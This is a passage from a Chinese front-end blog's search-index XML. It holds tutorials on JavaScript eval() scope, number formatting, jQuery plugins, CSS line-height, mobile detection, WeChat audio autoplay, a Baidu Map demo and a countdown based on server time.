    <content type="text"><![CDATA[eval()函数用法详解:此函数可能使用的频率并不是太高，但是在某些情况下具有很大的作用，下面就介绍一下eval()函数的用法。语法结构:1eval(str)此函数可以接受一个字符串str作为参数，并把此str当做一段javascript代码去执行，如果str执行结果是一个值则返回此值，否则返回undefined。如果参数不是一个字符串，则直接返回该参数，实例如下:1234eval("var a=1");//声明一个变量a并赋值1。eval("2+3");//执行加运算，并返回运算值。eval("mytest()");//执行mytest()函数。eval("&#123;b:2&#125;");//声明一个对象。在以上代码特别注意的是，最后一个语句是声明了一个对象，如果想返回此对象，则需要在对象外面再嵌套一层小括号，如下:1val(&quot;(&#123;b:2&#125;)&quot;);以上内容简单介绍了eval()函数的用法，比较容易理解。此函数最让人感到困惑的是关于它的作用域问题，下面就结合实例来介绍一下相关内容，先看一段代码实例:123456function a()&#123; eval("var x=1"); console.log(x); &#125; a(); console.log(x);在上面的代码中，第一个alert()函数能够弹出1，而第二个会因为x未定义而报错。由以上表现可以得出，eval()函数并不会创建一个新的作用域，并且它的作用域就是它所在的作用域。这在所有主流浏览器都是如此，但是有时候需要将eval()函数的作用域设置为全局，当然可以将eval()在全局作用域中使用，但是往往实际应用中，需要在局部作用域使用具有全局作用域的此函数，这个时候可以用window.eval()的方式实现，例如以上代码可以改造如下:123456function a()&#123; window.eval("var x=1"); console.log(x); &#125; a(); console.log(x);在上面的代码中，两个alert()语句都能够正常弹出1。但是此中方式在标准浏览器中是可以的，但是在IE8和IE8以下浏览器中的表现依然和eval()一样，作用域是它们所在的作用域。这个时候可以使用IE浏览器独有的window.execScript()解决IE8和IE8浏览器的问题。为了实现兼容所有主流浏览器，把代码改造如下:1234567891011function a()&#123; if(window.execScript)&#123; window.execScript("var x=1"); &#125; else&#123; window.eval("var x=1"); &#125; console.log(x); &#125; a(); console.log(x);如果浏览器支持window.execScript()，则使用此函数，不支持则使用window.eval()，这样就可以解决IE8和IE8以下浏览器的问题。特别说明:上面所有代码建议复制到本地进行测试，可能在本编辑器内有误。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>eval()函数</tag>
        <tag>eval()函数用法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript实现保留两位小数一位自动补零代码]]></title>
    <url>%2F2015%2F12%2F18%2Fjavascript%E5%AE%9E%E7%8E%B0%E4%BF%9D%E7%95%99%E4%B8%A4%E4%BD%8D%E5%B0%8F%E6%95%B0%E4%B8%80%E4%BD%8D%E8%87%AA%E5%8A%A8%E8%A1%A5%E9%9B%B6%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[javascript实现保留两位小数一位自动补零代码实例:本章节介绍一下如何实现对数字保留两位小数效果，如果数字的原本小数位数不到两位，那么缺少的就自动补零，这个也是为了统一的效果，先看代码实例:12345678910111213141516function returnFloat(value)&#123; var value=Math.round(parseFloat(value)*100)/100; var xsd=value.toString().split("."); if(xsd.length==1)&#123; value=value.toString()+".00"; return value; &#125; if(xsd.length&gt;1)&#123; if(xsd[1].length&lt;2)&#123; value=value.toString()+"0"; &#125; return value; &#125;&#125;var num=3.1;console.log(returnFloat(num));&nbsp;上面的代码实现了我们的要求，下面介绍一下它的实现过程。一.代码注释:1.function returnFloat(value){}，参数是要被转换的数字。&nbsp;2.var value=Math.round(parseFloat(value)*100)/100，这个应该是函数的核心之处,parseFloat(value)将参数转换为浮点数，因为参数有可能是字符串，乘以100是因为要保留两位小数，先将小数点向右移动两个位数，然后再利用Math.round()方法实行四舍五入计算，最后除以100，这样就实现了保留保留两位小数，并且还具有四舍五入效果，但是这个并不完美，如果参数数字本身的小数位数大于等于2是可以的，如3.1415，但是如3或者3.0这样的还是没有完美的实现，继续看下面。&nbsp;3.var xsd=value.toString().split(“.”)，使用点”.”value分隔成一个数组。&nbsp;4.if(xsd.length==1){value=value.toString()+”.00”;return value;}，如果数组的长度是1，也就是说不存在小数，那么就会为这个数字添加两个0，例如3会被转换成3.00。&nbsp;5.12345678if(xsd.length&gt;1)&#123; if(xsd[1].length&lt;2)&#123; value=value.toString()+"0"; &#125; return value;&#125;if(xsd.length&gt;1)用来判断数字的长度是否大于1，也就是数字是否具有小数，如有小数，但是小数的位数小于2，也就是类似3.1这样的，就会在后面加一个0，也就是会转换为3.10。&nbsp;&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js保留2位小数</tag>
        <tag>js保留两位小数自动补0</tag>
        <tag>js强制保留2位小数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax分页插件]]></title>
    <url>%2F2015%2F12%2F15%2Fajax%E5%88%86%E9%A1%B5%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[使用方法案例:1234$('#pageTool').Paging(&#123;pagesize:10,count:100&#125;);//或者var p = new Paging();p.init(&#123;target:'#pageTool',pagesize:10,count:100&#125;);属性和方法hash:true是否用url hash值的形式来表达分页，默认为true,但如果出现两个分页时，为导致互相影响，应保证只有一个对应hashpagesize:每页的条数current:当前页码，默认为1prevTpl上一页的模板,默认“上一页”nextTpl下一页的模板，默认“下一页”firstTpl首页的模板，默认“首页”lastTpl末页的模板，默认“末页”ellipseTpl省略号的模板，默认“…”toolbar: bool是否显示工具栏,默认为falsepageSizeList:[]当显示工具栏时有效，可设置每页条数，默认为[5,10,15,20]callback:function(page,size,count)翻页时的回调方法，page为当前页码,size为每页条数，count为总页数changePagesize:function(ps)修改每页的条数,参数为intgo:function(p)跳转至某一页,默认到currentrender:function(ops)重新渲染,ops:{count:int,pagesize:int,current:int,pagecount:int}查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>ajax分页插件</tag>
        <tag>jq分页插件</tag>
        <tag>js分页插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dialog对话框弹层插件]]></title>
    <url>%2F2015%2F12%2F15%2Fdialog%E5%AF%B9%E8%AF%9D%E6%A1%86%E5%BC%B9%E5%B1%82%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[用法:123456789&lt;link rel="stylesheet" type="text/css" href="../dist/dialog.css"&gt;&lt;input type="button" id="btn_dialog" value="打开浮层"/&gt;&lt;div id="dialog-content" style="display:none;"&gt;这是内容&lt;/div&gt;&lt;script src="../src/jquery-1.9.1.min.js"&gt;&lt;/script&gt;&lt;script src="../src/dialog.js"&gt;&lt;/script&gt;&lt;script&gt; var dialog = new Dialog(); dialog.init(&#123;target:"#dialog-content",trigger:"#btn_dialog",mask:true,width:500,height:300,title:'标题'&#125;);&lt;/script&gt;或者用jquery方式调用:1234567&lt;link rel="stylesheet" type="text/css" href="../dist/dialog.css"&gt;&lt;input type="button" id="btn_dialogjquery" value="jq打开浮层"/&gt;&lt;div id="dialog-contentjq" style="display:none;"&gt;这是内容22&lt;/div&gt;&lt;script src="../src/dialog-jquery.js"&gt;&lt;/script&gt;&lt;script&gt;$('#btn_dialogjquery').Dialog(&#123;target:"#dialog-contentjq",mask:true,width:500,height:300,title:'标题'&#125;)&lt;/script&gt;继承类alert和confirm提示(jquery模式下)：HTML12345&lt;link rel="stylesheet" type="text/css" href="../dist/dialog.css"&gt;&lt;input type="button" id="btn_alert" value="alert"/&gt;&lt;input type="button" id="btn_alert2" value="alert定时关闭"/&gt;&lt;input type="button" id="btn_confirm" value="confirm三种按钮"/&gt;&lt;input type="button" id="btn_confirmdefault" value="confirm默认"/&gt;Javascript12345678910111213141516171819202122232425$('#btn_alert').click(function()&#123; $.alert('选好商品才能上传素材哦',true,function()&#123; alert('你点击了ok') &#125;)&#125;);$('#btn_alert2').click(function()&#123; $.alert('选好商品才能上传素材哦')&#125;);$('#btn_confirm').click(function() &#123; $.confirm('下载全部9张图片至本地相册? &lt; divclass = "confirm-title2" &gt; 文字内容已复制 &lt; /div&gt;', [&#123; yes: "是" &#125;, &#123; no: '否' &#125;, &#123; close: '关闭' &#125;], function(type) &#123; $.alert('您点击了' + type); this.hide(); &#125;); &#125;) $('#btn_confirmdefault').click(function() &#123; $.confirm('你确定要删除这条消息吗? ', null, function(type) &#123; $.alert('您点击了' + type); this.hide(); &#125;); &#125;)属性或方法trigger:触发对象target:弹出内容，可以为#id,或者jquery对象mask:是否有遮罩层title:标题zIndex:z-indexcloseTpl:关闭html(默认:&lt;span class=&quot;ui-dialog-close js-dialog-close&quot;&gt;x&lt;/span&gt;)titleTpl:标题html(默认：&lt;div class=&quot;ui-dialog-title&quot;&gt;&lt;/div&gt;)fixed:bool是否固定位置，默认不固定方法及回调show:显示弹层hide:隐藏beforeShow：function(content)显示前的方法回调,content是浮层内容对象beforeHide：function(content)隐藏前的方法回调,content是浮层内容对象setPosition:function()设置位置居中事件hide:$(&#39;.ui-dialog&#39;).trigger(&#39;hide&#39;);触发弹窗的隐藏事件.查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>dialog对话框弹层</tag>
        <tag>弹框插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端城市联选插件]]></title>
    <url>%2F2015%2F12%2F15%2F%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%9F%8E%E5%B8%82%E8%81%94%E9%80%89%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[用法：123456789101112131415161718192021&lt;!DOCTYPE&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;选择地区&lt;/title&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"&gt;&lt;link rel="stylesheet" type="text/css" href="../dist/mobile-select-area.css"&gt;&lt;link rel="stylesheet" type="text/css" href="../dist/dialog.min.css"&gt;&lt;script type="text/javascript" src="../dist/zepto.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="../dist/dialog.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="../dist/dialog-jquery.min.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="../dist/mobile-select-area.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;input type="text" id="txt_area" value="浙江省 杭州市 滨江区"/&gt;&lt;input type="hidden" id="hd_area" value="1,1,1"/&gt;&lt;script&gt;var selectArea = new MobileSelectArea();selectArea.init(&#123;trigger:$('#txt_area'),value:$('#hd_area').val(),data:'data.json'&#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;属性及方法trigger:Z触发弹窗的DOM元素 ，可以是input或其他value初始值,data:当data为json对象时可以直接解析当data为string发送ajax请求后返回json,格式如下：12345678910111213141516171819202122232425262728&#123; "data": [&#123; "id": 1, "name": "浙江省", "child": [&#123; "id": "1", "name": "杭州市", "child": [&#123; "id": 1, "name": "滨江区" &#125;] &#125;] &#125;, &#123; "id": 2, "name": "江苏省", "child": [&#123; "id": "1", "name": "南京", "child": [&#123; "id": 1, "name": "解放区" &#125;] &#125;] &#125;, &#123; "id": 3, "name": "湖北省" &#125;] &#125;callback:&emsp;&emsp;选中后的回调，默认有填充trigger的value值，以及赋值它后面紧跟着的hidden的value值，以逗号分隔id，空格分隔文字点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>mobile-select-area</tag>
        <tag>手机端地区联选</tag>
        <tag>手机端城市联选</tag>
        <tag>手机联动选择地区</tag>
        <tag>移动端地区联选</tag>
        <tag>移动端城市联选</tag>
        <tag>移动端联动选择地区</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于jQuery-autocomplete文本框自动联想补全]]></title>
    <url>%2F2015%2F12%2F01%2F%E5%9F%BA%E4%BA%8Ejquery-autocomplete%E6%96%87%E6%9C%AC%E6%A1%86%E8%87%AA%E5%8A%A8%E8%81%94%E6%83%B3%E8%A1%A5%E5%85%A8%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;基于jQuery文本框自动联想补全特效。这是一款简单使用的jQuery自动完成插件，可定义索引关键词，可设置输入框的宽高，支持搜索回调函数。效果图如下：实现的代码。html代码：1234567&lt;div id="demo"&gt;&lt;div class="wrapper"&gt;&lt;h3&gt;试试输入"侠名风"&lt;/h3&gt;&lt;div id="search-form"&gt;&lt;/div&gt;&lt;div id="message"&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;js代码：123456789101112var proposals = ['at', 'boat', 'bear', 'chief', 'dog', 'drink', 'elephant', 'fruit', 'grave', 'hotel', 'illness', 'London', 'motorbike', '侠名风博客', '侠名风jQuery', '侠名风HTML','侠名风grycheng','侠名风JavaScript'];$(document).ready(function () &#123; $('#search-form').autocomplete(&#123; hints: proposals, width: 300, height: 30, onSubmit: function (text) &#123; $('#message').html('Selected: **' + text + '**'); &#125; &#125;);&#125;);查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>jQuery-autocomplete</tag>
        <tag>文本框自动联想补全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[line-height:150%和line-height:1.5的区别]]></title>
    <url>%2F2015%2F12%2F01%2Fline-height150%E5%92%8Cline-height1-5%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[“%”：是继承父级元素的距离；“无单位”：是子元素计算各自的行距离；举个栗子：12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;Document&lt;/title&gt;&lt;style&gt;body&#123;font-size:14px;line-height:150%;background: black;&#125;p&#123;font-size:26px;background: gray;color: white;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;你好！&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;效果如图：1、当line-height:XX%时：body{font-size:14px;line-height:150%;}p{font-size:26px;}结果就是：body{line-height:21px;}//14*150%=21p{line-heigt:21px;}//继承父元素&nbsp;再举个栗子：12345678910111213141516171819202122&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;Document&lt;/title&gt;&lt;style&gt;body&#123;font-size:14px;line-height:1.5;background: black;&#125;p&#123;font-size:26px;background: gray;color: white;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;你好！&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;效果如图：2、当line-height:X.X时：body{font-size:14px;line-height:1.5;}p{font-size:26px;}结果就是：body{line-height:21px;}//14*1.5=21p{line-height:39px;}//26*1.5=39]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>line-height:150%和line-height:1.5的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[简单而清晰的判断PC端和移动端的函数]]></title>
    <url>%2F2015%2F12%2F01%2F%E7%AE%80%E5%8D%95%E8%80%8C%E6%B8%85%E6%99%B0%E7%9A%84%E5%88%A4%E6%96%ADpc%E7%AB%AF%E5%92%8C%E7%A7%BB%E5%8A%A8%E7%AB%AF%E7%9A%84%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718function browserRedirect() &#123; var sUserAgent = navigator.userAgent.toLowerCase(); var bIsIpad = sUserAgent.match(/ipad/i) == "ipad"; var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os"; var bIsMidp = sUserAgent.match(/midp/i) == "midp"; var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4"; var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb"; var bIsAndroid = sUserAgent.match(/android/i) == "android"; var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce"; var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile"; if (bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM) &#123; alert('手机端访问'); &#125; else &#123; alert('电脑端访问'); &#125;&#125;browserRedirect();]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>判断PC端和移动端的函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自执行匿名函数剖析]]></title>
    <url>%2F2015%2F11%2F30%2F%E8%87%AA%E6%89%A7%E8%A1%8C%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0%E5%89%96%E6%9E%90%2F</url>
    <content type="text"><![CDATA[在很多js代码中我们常常会看见这样一种写法：123(function( window, undefined ) &#123;// code&#125;)(window);这种写法我们称之为自执行匿名函数（self-executing anonymous function）。正如它的名字一样，它是自己执行自己的，前一个括号是一个匿名函数，后一个括号代表立即执行。一、函数和函数表达式的区别语法1234567function keqing()&#123; //函数 alert('Hi~'); &#125;var keqing = function()&#123; //函数表达式 alert('Hi~')&#125;函数的函数声明有一个重要特征 —— 函数声明提升12345keqing(); //Hi~function keqing()&#123; alert('Hi~');&#125;//函数：在读取执行代码之前会先读取函数声明12345keqing(); // Uncaught TypeError: keqing is not a functionvar keqing = function()&#123; alert('Hi~');&#125;//函数表达式：没有函数声明提升，在执行前必须先赋值回到我们的自执行匿名函数123456789function()&#123; alert('aaaa'); &#125;() //出错，因为这是一个匿名函数，函数后不能跟圆括号//函数声明想要变成函数表达式，就需要给它加一个圆括号(function()&#123; alert('aaaa');&#125;)() // aaaa 这样就变成了自执行匿名函数二、自执行匿名函数剖析回到我们最开始的栗子123(function( window, undefined ) &#123; // code&#125;)(window);1.自执行匿名函数写法的好处：防止变量名冲突2.自执行匿名函数的其他多种写法：123456789101112( function() &#123;&#125;() );( function() &#123;&#125; )();[ function() &#123;&#125;() ];~ function() &#123;&#125;();! function() &#123;&#125;();+ function() &#123;&#125;();- function() &#123;&#125;();var f = function() &#123;&#125;();//当然不需要都记住，会用就OK。还有很多不常见的我就不一一举例了..3.为何要传入window？这样传入window可将其从全局变量变为局部变量，在函数作用域内可以直接访问到window，就不用将作用域链退回到顶层作用域了。在压缩代码时，可以对window进行优化。4.为何要增加参数undefined？由于undefined在一些情况下有可能会被重写，为确保在自执行匿名函数里的undefined是”真的undefined”，就需要增加参数undefined。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>自执行匿名函数</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信浏览器实现音乐自动播放]]></title>
    <url>%2F2015%2F11%2F27%2F%E5%BE%AE%E4%BF%A1%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%9E%E7%8E%B0%E9%9F%B3%E4%B9%90%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTML5音频播放在移动端有局限性，在移动版 Safari 中加载的页面上，不能自动播放音频文件。音频文件只能从用户触发的触摸（单击）事件加载。如果在 HTML 标记中使用了 autoplay 属性，那么移动版 Safari 将会忽略这个属性，并且不会在加载页面时播放此文件，避免移动端流量在不知不觉中浪费，很人性化的设计。但对HTML5应用开发者来说，这不是个好消息。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网上查找了很多资料，通过hack手段来实现自动播放是不可能的，幸运的是，我们大多数情况下是依赖微信浏览器的。这里有个方法貌似可行：12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head lang="en"&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;Audio auto play in mobile&lt;/title&gt;&lt;script src="jquery-1.10.2.min.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;audio preload="preload" id="car_audio" src="music.mp3" loop=""&gt;&lt;/audio&gt;&lt;script&gt;setTimeout(function()&#123;$(window).scrollTop(1);&#125;,0);/*音乐*/var audio = $('#car_audio');var isPlaying = false;function playAudio() &#123;var audio = $('#car_audio');if (audio.attr('src') == undefined) &#123;audio.attr('src', audio.data('src'));&#125;audio[0].play();isPlaying = true;&#125;$(function()&#123;playAudio();document.addEventListener("WeixinJSBridgeReady", function () &#123;WeixinJSBridge.invoke('getNetworkType', &#123;&#125;, function (e) &#123;network = e.err_msg.split(":")[1]; //结果在这里playAudio();&#125;);&#125;, false);&#125;)&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;强调一下，只适用于微信浏览器。测试环境：iPhone 6 ios 8.3测试时发现的问题：如果mp3文件过大(大于2M)，有可能不会自动播放， 又换了300KB的，测试OK！有发现更有效的方法，或者无效机型，欢迎留言！]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>微信浏览器实现音乐自动播放</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[百度地图API自定义地图]]></title>
    <url>%2F2015%2F11%2F26%2F%E7%99%BE%E5%BA%A6%E5%9C%B0%E5%9B%BEapi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%9C%B0%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[http://api.map.baidu.com/lbsapi/creatmap/index.htmlhttp://developer.baidu.com/map/index.php?title=webapihttp://developer.baidu.com/map/index.php?title=webapi123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=gb2312" /&gt;&lt;meta name="keywords" content="百度地图,百度地图API，百度地图自定义工具，百度地图所见即所得工具" /&gt;&lt;meta name="description" content="百度地图API自定义地图，帮助用户在可视化操作下生成百度地图" /&gt;&lt;title&gt;百度地图API自定义地图&lt;/title&gt;&lt;!--引用百度地图API--&gt;&lt;style type="text/css"&gt; html,body&#123;margin:0;padding:0;&#125; .iw_poi_title &#123;color:#CC5522;font-size:14px;font-weight:bold;overflow:hidden;padding-right:13px;white-space:nowrap&#125; .iw_poi_content &#123;font:12px arial,sans-serif;overflow:visible;padding-top:4px;white-space:-moz-pre-wrap;word-wrap:break-word&#125;&lt;/style&gt;&lt;script type="text/javascript" src="http://api.map.baidu.com/api?key=&amp;amp;v=1.1&amp;amp;services=true"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;!--百度地图容器--&gt; &lt;div style="width:697px;height:550px;border:#ccc solid 1px;" id="dituContent"&gt;&lt;/div&gt;&lt;/body&gt;&lt;script type="text/javascript"&gt; //创建和初始化地图函数： function initMap()&#123; createMap();//创建地图 setMapEvent();//设置地图事件 addMapControl();//向地图添加控件 addMarker();//向地图中添加marker &#125; //创建地图函数： function createMap()&#123; var map = new BMap.Map("dituContent");//在百度地图容器中创建一个地图 var point = new BMap.Point(116.266864,39.289613);//定义一个中心点坐标 map.centerAndZoom(point,8);//设定地图的中心点和坐标并将地图显示在地图容器中 window.map = map;//将map变量存储在全局 &#125; //地图事件设置函数： function setMapEvent()&#123; map.enableDragging();//启用地图拖拽事件，默认启用(可不写) map.enableScrollWheelZoom();//启用地图滚轮放大缩小 map.enableDoubleClickZoom();//启用鼠标双击放大，默认启用(可不写) map.enableKeyboard();//启用键盘上下左右键移动地图 &#125; //地图控件添加函数： function addMapControl()&#123; //向地图中添加缩放控件 var ctrl_nav = new BMap.NavigationControl(&#123;anchor:BMAP_ANCHOR_TOP_LEFT,type:BMAP_NAVIGATION_CONTROL_LARGE&#125;); map.addControl(ctrl_nav); //向地图中添加缩略图控件 var ctrl_ove = new BMap.OverviewMapControl(&#123;anchor:BMAP_ANCHOR_BOTTOM_RIGHT,isOpen:1&#125;); map.addControl(ctrl_ove); //向地图中添加比例尺控件 var ctrl_sca = new BMap.ScaleControl(&#123;anchor:BMAP_ANCHOR_BOTTOM_LEFT&#125;); map.addControl(ctrl_sca); &#125; //标注点数组 var markerArr = [&#123;title:"我的标记",content:"我的备注",point:"116.322918|39.927773",isOpen:0,icon:&#123;w:21,h:21,l:0,t:0,x:6,lb:5&#125;&#125; ,&#123;title:"涂聚文",content:"涂聚文备注",point:"116.385584|39.904752",isOpen:0,icon:&#123;w:21,h:21,l:0,t:0,x:6,lb:5&#125;&#125; ,&#123;title:"保定办事处",content:"我的备注公司在线",point:"115.452784|38.88096",isOpen:0,icon:&#123;w:21,h:21,l:0,t:0,x:6,lb:5&#125;&#125; ]; //创建marker function addMarker()&#123; for(var i=0;i&lt;markerArr.length;i++)&#123; var json = markerArr[i]; var p0 = json.point.split("|")[0]; var p1 = json.point.split("|")[1]; var point = new BMap.Point(p0,p1); var iconImg = createIcon(json.icon); var marker = new BMap.Marker(point,&#123;icon:iconImg&#125;); var iw = createInfoWindow(i); var label = new BMap.Label(json.title,&#123;"offset":new BMap.Size(json.icon.lb-json.icon.x+10,-20)&#125;); marker.setLabel(label); map.addOverlay(marker); label.setStyle(&#123; borderColor:"#808080", color:"#333", cursor:"pointer" &#125;); (function()&#123; var index = i; var _iw = createInfoWindow(i); var _marker = marker; _marker.addEventListener("click",function()&#123; this.openInfoWindow(_iw); &#125;); _iw.addEventListener("open",function()&#123; _marker.getLabel().hide(); &#125;) _iw.addEventListener("close",function()&#123; _marker.getLabel().show(); &#125;) label.addEventListener("click",function()&#123; _marker.openInfoWindow(_iw); &#125;) if(!!json.isOpen)&#123; label.hide(); _marker.openInfoWindow(_iw); &#125; &#125;)() &#125; &#125; //创建InfoWindow function createInfoWindow(i)&#123; var json = markerArr[i]; var iw = new BMap.InfoWindow("&lt;b class='iw_poi_title' title='" + json.title + "'&gt;" + json.title + "&lt;/b&gt;&lt;div class='iw_poi_content'&gt;"+json.content+"&lt;/div&gt;"); return iw; &#125; //创建一个Icon function createIcon(json)&#123; var icon = new BMap.Icon("http://app.baidu.com/map/images/us_mk_icon.png", new BMap.Size(json.w,json.h),&#123;imageOffset: new BMap.Size(-json.l,-json.t),infoWindowOffset:new BMap.Size(json.lb+5,1),offset:new BMap.Size(json.x,json.h)&#125;) return icon; &#125; initMap();//创建和初始化地图&lt;/script&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>百度地图</tag>
        <tag>百度地图API</tag>
        <tag>百度地图所见即所得工具</tag>
        <tag>百度地图自定义工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS获取服务器当前时间制作倒计时]]></title>
    <url>%2F2015%2F11%2F25%2Fjs%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4%E5%88%B6%E4%BD%9C%E5%80%92%E8%AE%A1%E6%97%B6%2F</url>
    <content type="text"><![CDATA[很多小伙伴做倒计时，会使用2个方式：1、使用本地时间来进行倒计时，这个是最大的误区，如果用户改变了本地时间，那你这个倒计时的功能就是白搭了；2、要求服务器返回一个服务器时间给到前端，然后前端根据服务器的时间进行倒计时，这个方式是最常用的方式，也是最普遍的方式，但这样就必须要前后端配合起来来开发了；今天就给大家介绍一种，完全前端的方式，并且也是获取的服务器的时间方式；这样以后大家做倒计时，就不要去依赖后端人员返回时间给你了，一个方法完全搞定，那就是直接空请求当前的服务器。来说下原理吧，原理很简单：就是获取服务器返回的头部信息中的Date属性，但是这个得到的GMT(格林尼治时间) ，所以要转换一下为东八区的时间 ，这个就是响应服务器的当前时间，主要是处理客户端本地机器时间错误问题；本来是只想借助于jQuery来实现的，因为需要使用getResponseHeader的方法，但是奈何IE系列不兼容XMLHttpRequest，必须要先对XHR做一下兼容了，所以只能苦逼的使用原生来做了！HTML代码：1234567891011&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset='UTF-8'/&gt;&lt;title&gt;JS获取服务器当前时间制作倒计时&lt;/title&gt;&lt;script src="http://www.npm8.com/jquery.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;距到期&lt;span id="end2"&gt;xx&lt;/span&gt;天&lt;/body&gt;&lt;/html&gt;&nbsp;JS代码：123456789101112131415161718192021222324252627282930313233function countday()&#123; var day=0; var xhr=new XMLHttpRequest(); if (!xhr) &#123; xhr=new ActiveXObject("Mirosoft.XMLHTTP"); &#125;; xhr.open('HEAD',location.href+'?r='+(new Date()).valueOf(),false); xhr.onreadystatechange=function()&#123; if (xhr.readyState==4 &amp;amp;&amp;amp; xhr.status==200) &#123; var nowstr=new Date(xhr.getResponseHeader("Date"))+''; var date=new Date(Date.parse(nowstr.replace(/-/g,"/"))).getTime(); var reg = /^\s*([1-9]\d&#123;3&#125;)\-(\d&#123;1,2&#125;)\-(\d&#123;1,2&#125;)\s*$/; var _end1='2015-11-19'; if (!reg.test(_end1)) &#123; throw new Error("Date Format Is Error !"); return; &#125; var end1 = new Date(_end1.replace(reg, "$1"), parseInt(_end1.replace(reg, "$2")) - 1, _end1.replace(reg, "$3")); day=Math.ceil((end1 - date)/(1000*60*60*24)); if(day&lt;1)&#123; window.location.href="http://www.baidu.com"; return; &#125;; &#125;; &#125; xhr.send(null); return day;&#125;window.onload = function() &#123; $('#end2').html(countday());&#125;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>JS获取服务器当前时间</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于实时监听输入框的值变化]]></title>
    <url>%2F2015%2F11%2F25%2F%E5%85%B3%E4%BA%8E%E5%AE%9E%E6%97%B6%E7%9B%91%E5%90%AC%E8%BE%93%E5%85%A5%E6%A1%86%E7%9A%84%E5%80%BC%E5%8F%98%E5%8C%96%2F</url>
